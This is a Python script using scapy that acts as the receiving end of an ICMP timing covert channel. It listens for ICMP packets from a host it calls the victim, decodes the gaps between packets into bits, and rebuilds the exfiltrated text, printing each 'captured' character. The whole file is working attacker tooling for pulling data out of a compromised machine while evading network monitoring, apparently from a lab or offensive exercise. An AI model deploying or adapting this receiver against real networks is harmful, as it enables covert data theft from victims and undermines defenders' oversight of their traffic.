from scapy.all import sniff, IP, ICMP
import time

# --- CONFIGURATION ---
# IMPORTANT: Put the Victim's IP here to ignore your own outgoing replies
VICTIM_IP = "10.0.0.6"  

# Thresholds (Must match Sender's logic + margin)
DOT_LIMIT  = 0.2  # < 0.2s = '0'
DASH_LIMIT = 0.5  # < 0.5s = '1'
# > 0.5s = End of Character

INTERFACE = "eth0" # Ensure this matches 'ip a'

# Global variables
last_time = 0
current_binary = ""
received_text = ""

def process_timing_covert_channel(packet):
    global last_time, current_binary, received_text
    
    # 1. FILTER: Only process packets sent BY the Victim
    if not packet.haslayer(IP) or packet[IP].src != VICTIM_IP:
        return

    current_time = time.time()
    
    # Initialize clock on first packet
    if last_time == 0:
        last_time = current_time
        return

    # 2. Calculate Silence
    delta = current_time - last_time
    last_time = current_time

    # 3. Decode
    if delta < DOT_LIMIT:
        current_binary += "0"
        print(".", end="", flush=True)
    elif delta < DASH_LIMIT:
        current_binary += "1"
        print("-", end="", flush=True)
    else:
        # Gap > 0.5s means "End of Character"
        if len(current_binary) == 8:
            try:
                char = chr(int(current_binary, 2))
                received_text += char
                print(f" [Captured: {char}]")
            except ValueError:
                print(" [Error: Invalid Byte]")
        
        # Reset binary buffer for the next character
        current_binary = ""

    # Failsafe: If buffer gets too long (sync error), reset it
    if len(current_binary) > 8:
        current_binary = ""

print(f"[*] Listening for ICMP from {VICTIM_IP} on {INTERFACE}...")
sniff(filter="icmp", iface=INTERFACE, prn=process_timing_covert_channel, store=0)
